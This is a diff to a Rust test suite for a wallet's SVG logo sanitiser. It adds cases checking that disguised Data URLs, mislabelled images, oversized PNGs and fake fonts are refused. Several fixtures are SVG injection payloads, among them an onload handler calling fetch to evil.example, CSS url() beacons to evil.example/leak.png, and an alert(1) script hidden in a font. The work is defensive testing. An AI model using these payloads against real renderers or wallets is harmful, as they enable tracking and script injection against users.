@@ -4,17 +4,18 @@
 
 use serde_json::json;
 use siros_transaction_data::{
-    CssFault, ImageFault, Incompatibility, IntegrityFault, Location, LocationStep, SvgFault,
-    MAX_DEPTH, MAX_RESOURCES,
+    CssFault, DataFault, Dimensions, FontFault, ImageFault, Incompatibility, IntegrityFault,
+    Location, LocationStep, SvgFault, MAX_DEPTH, MAX_RESOURCES,
 };
 
 use crate::common::{
-    b64, configured, credential, entries, ok, query, rows, sri, Documents, Host, Shown, CARD,
+    b64, configured, credential, entries, ok, png, query, rows, sri, Documents, Host, Shown, CARD,
 };
 
 const TYPE: &str = "urn:paso:sca:com.example:logo:1";
 const SVG: &str = "http://www.w3.org/2000/svg";
 const XHTML: &str = "http://www.w3.org/1999/xhtml";
+const XML: &str = "http://www.w3.org/XML/1998/namespace";
 
 /// An SVG document of 10 by 10 holding `inner`.
 fn svg(inner: &str) -> String {
@@ -54,6 +55,34 @@ fn unpinned(url: &str) -> SvgFault {
     SvgFault::ReferenceUnpinned(url.to_owned())
 }
 
+fn attribute(element: &str, namespace: Option<&str>, name: &str) -> SvgFault {
+    SvgFault::Attribute {
+        element: element.to_owned(),
+        namespace: namespace.map(str::to_owned),
+        name: name.to_owned(),
+    }
+}
+
+/// A Data URL of `bytes` in base64, of `media_type`.
+fn data(media_type: &str, bytes: &[u8]) -> String {
+    format!("data:{media_type};base64,{}", b64(bytes))
+}
+
+/// A WOFF2 font of one table: its header, a directory entry for `cmap` of 4 bytes, and 4 bytes
+/// of compressed data.
+fn woff2() -> Vec<u8> {
+    let mut font = b"wOF2".to_vec();
+    font.extend_from_slice(&[0, 1, 0, 0]); // flavor: TrueType outlines
+    font.extend_from_slice(&54_u32.to_be_bytes()); // length
+    font.extend_from_slice(&[0, 1, 0, 0]); // numTables, reserved
+    font.extend_from_slice(&8_u32.to_be_bytes()); // totalSfntSize
+    font.extend_from_slice(&4_u32.to_be_bytes()); // totalCompressedSize
+    font.extend_from_slice(&[0; 24]); // versions, metadata and private blocks
+    font.extend_from_slice(&[0, 4]); // flags: cmap, null transform; origLength 4
+    font.extend_from_slice(b"data");
+    font
+}
+
 #[test]
 fn each_vector_outside_the_subset_is_refused() {
     let x = "https://evil.example/x.png";
@@ -61,6 +90,18 @@ fn each_vector_outside_the_subset_is_refused() {
         "data:image/svg+xml;base64,{}",
         b64(br#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(https://evil.example/n.png)"/></svg>"#)
     );
+    let active =
+        br#"<svg xmlns="http://www.w3.org/2000/svg" onload="fetch('https://evil.example/t')"/>"#;
+    let active_png = data("image/png", active);
+    let active_percent: String = std::iter::once("data:image/png,".to_owned())
+        .chain(active.iter().map(|byte| format!("%{byte:02X}")))
+        .collect();
+    let gif = data(
+        "image/png",
+        b"GIF89a\x01\x00\x01\x00\x80\x00\x00!\xff\x0bNETSCAPE2.0",
+    );
+    let text = data("image/jpeg", b"hello");
+    let huge = data("image/png", &png(100_000, 100_000));
     let rows: Vec<(&str, String, SvgFault)> = vec![
         (
             "url( lowercase",
@@ -225,22 +266,22 @@ fn each_vector_outside_the_subset_is_refused() {
         (
             "an event handler",
             svg(r#"<rect width="10" height="10" onload="fetch('https://evil.example/t')"/>"#),
-            SvgFault::Attribute("rect".to_owned(), "onload".to_owned()),
+            attribute("rect", None, "onload"),
         ),
         (
             "an HREF attribute in capitals",
             svg(&format!(r#"<image width="10" height="10" HREF="{x}"/>"#)),
-            SvgFault::Attribute("image".to_owned(), "HREF".to_owned()),
+            attribute("image", None, "HREF"),
         ),
         (
             "xml:base",
             svg(r##"<g xml:base="https://evil.example/"><use href="#a"/></g>"##),
-            SvgFault::Attribute("g".to_owned(), "base".to_owned()),
+            attribute("g", Some(XML), "base"),
         ),
         (
             "an href on an element that takes none",
             svg(&format!(r#"<rect href="{x}"/>"#)),
-            SvgFault::Attribute("rect".to_owned(), "href".to_owned()),
+            attribute("rect", None, "href"),
         ),
         (
             "xlink:href to an unpinned document",
@@ -253,14 +294,14 @@ fn each_vector_outside_the_subset_is_refused() {
         (
             "a tab inside the scheme",
             svg("<image width=\"10\" height=\"10\" href=\"ht&#9;tps://evil.example/x.png\"/>"),
-            unpinned("ht\ttps://evil.example/x.png"),
+            SvgFault::ReferenceNotHttps("ht\ttps://evil.example/x.png".to_owned()),
         ),
         (
             "an SVG Data URL nested",
             svg(&format!(
                 r#"<image width="10" height="10" href="{nested}"/>"#
             )),
-            SvgFault::DataReference(nested.clone()),
+            SvgFault::ResourceType(nested.clone()),
         ),
         (
             "@font-face src unpinned",
@@ -353,6 +394,46 @@ fn each_vector_outside_the_subset_is_refused() {
             SvgFault::Css(CssFault::CustomProperty("--u".to_owned())),
         ),
         (
+            "a Data URL labelled PNG holding an SVG document",
+            svg(&format!(
+                r#"<image width="1" height="1" href="{active_png}"/>"#
+            )),
+            SvgFault::ResourceType(active_png.clone()),
+        ),
+        (
+            "a percent-encoded Data URL labelled PNG holding an SVG document",
+            svg(&format!(
+                r#"<rect style="mask-image:url({active_percent})"/>"#
+            )),
+            SvgFault::ResourceType(active_percent.clone()),
+        ),
+        (
+            "a Data URL labelled PNG holding an animated GIF",
+            svg(&format!(r#"<image width="1" height="1" href="{gif}"/>"#)),
+            SvgFault::ResourceType(gif.clone()),
+        ),
+        (
+            "a Data URL labelled JPEG holding text",
+            svg(&format!(r#"<image width="1" height="1" href="{text}"/>"#)),
+            SvgFault::ResourceType(text.clone()),
+        ),
+        (
+            "a Data URL of a PNG of 100000 by 100000 pixels",
+            svg(&format!(r#"<image width="1" height="1" href="{huge}"/>"#)),
+            SvgFault::ResourceTooManyPixels(
+                huge.clone(),
+                Dimensions {
+                    width: 100_000,
+                    height: 100_000,
+                },
+            ),
+        ),
+        (
+            "a Data URL with a broken percent escape",
+            svg(r#"<image width="1" height="1" href="data:image/png,%zz"/>"#),
+            SvgFault::DataReference("data:image/png,%zz".to_owned(), DataFault::Percent),
+        ),
+        (
             "a function the subset does not know",
             svg(r#"<rect style="fill:element(#a) attr(href url)"/>"#),
             SvgFault::Css(CssFault::Function("element".to_owned())),
@@ -439,18 +520,43 @@ fn an_exported_logo_is_shown() {
     assert_eq!(outcome(logo, Vec::new()), shown());
 }
 
-/// A pinned resource passes when it is a PNG or JPEG image or a font, and is refused when it is
-/// an SVG document or a style sheet; at most `MAX_RESOURCES` are fetched.
+/// A pinned resource passes when it is a PNG or JPEG image or a font whose header reads, and is
+/// refused when it is an SVG document, a style sheet, or a font whose directory does not read.
+/// The wallet fetches each URL once, checks it against every integrity value the document gives
+/// it, and fetches at most `MAX_RESOURCES` URLs.
 #[test]
 fn resources_pass_by_their_content() {
     let pinned = |url: &str, body: &[u8]| format!("{url}#{}", sri(body).replace('=', "%3D"));
-    let woff2 = b"wOF2\x00\x01\x00\x00font".to_vec();
+    let face = |source: &str| {
+        svg(&format!(
+            "<style>@font-face{{font-family:x;src:url({source})}}</style>"
+        ))
+    };
     let font = "https://cdn.example/f.woff2";
-    let face = svg(&format!(
-        "<style>@font-face{{font-family:x;src:url({})}}</style>",
-        pinned(font, &woff2)
-    ));
-    assert_eq!(outcome(&face, vec![(font.to_owned(), ok(&woff2))]), shown());
+    let woff2 = woff2();
+    assert_eq!(
+        outcome(
+            &face(&pinned(font, &woff2)),
+            vec![(font.to_owned(), ok(&woff2))]
+        ),
+        shown()
+    );
+    assert_eq!(
+        outcome(&face(&data("font/woff2", &woff2)), Vec::new()),
+        shown(),
+        "a Data URL font"
+    );
+    let otto_svg = br#"OTTO<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>"#;
+    assert_eq!(
+        outcome(
+            &face(&pinned(font, otto_svg)),
+            vec![(font.to_owned(), ok(otto_svg))]
+        ),
+        refused(SvgFault::ResourceFont(
+            font.to_owned(),
+            FontFault::Truncated
+        ))
+    );
 
     let inner = br#"<svg xmlns="http://www.w3.org/2000/svg"><rect style="fill:url(https://evil.example/leak.png)"/></svg>"#;
     let sheet = b"rect{fill:url(https://evil.example/leak.png)}";
@@ -458,16 +564,55 @@ fn resources_pass_by_their_content() {
         ("https://img.example/n.svg", inner.as_slice()),
         ("https://img.example/s.css", sheet.as_slice()),
     ] {
-        let reference = pinned(url, body);
         let document = svg(&format!(
-            r#"<image width="1" height="1" href="{reference}"/>"#
+            r#"<image width="1" height="1" href="{}"/>"#,
+            pinned(url, body)
         ));
         assert_eq!(
             outcome(&document, vec![(url.to_owned(), ok(body))]),
-            refused(SvgFault::ResourceType(reference)),
+            refused(SvgFault::ResourceType(url.to_owned())),
             "{url}"
         );
     }
+
+    let url = "https://img.example/a.png";
+    let part = png(1, 1);
+    let digest = sri(&part);
+    // The fragment with its character at `at` percent-encoded.
+    let spelled = |at: usize| -> String {
+        digest
+            .char_indices()
+            .map(|(i, c)| {
+                if i == at {
+                    format!("%{:02X}", u32::from(c))
+                } else {
+                    c.to_string()
+                }
+            })
+            .collect()
+    };
+    let spellings: String = std::iter::once(format!(" {url}#{digest}"))
+        .chain((0..MAX_RESOURCES).map(|at| format!("{url}#{}", spelled(at))))
+        .map(|reference| format!(r#"<image width="1" height="1" href="{reference}"/>"#))
+        .collect();
+    assert_eq!(
+        outcome(&svg(&spellings), vec![(url.to_owned(), ok(&part))]),
+        shown(),
+        "one URL, its fragment spelled {} ways",
+        MAX_RESOURCES + 1
+    );
+    let other = pinned(url, b"other");
+    let both = svg(&format!(
+        r#"<image width="1" height="1" href="{}"/><image width="1" height="1" href="{other}"/>"#,
+        pinned(url, &part)
+    ));
+    assert_eq!(
+        outcome(&both, vec![(url.to_owned(), ok(&part))]),
+        refused(SvgFault::ReferenceIntegrity(
+            other,
+            IntegrityFault::Mismatch
+        ))
+    );
 
     let images: String = (0..=MAX_RESOURCES)
         .map(|i| {
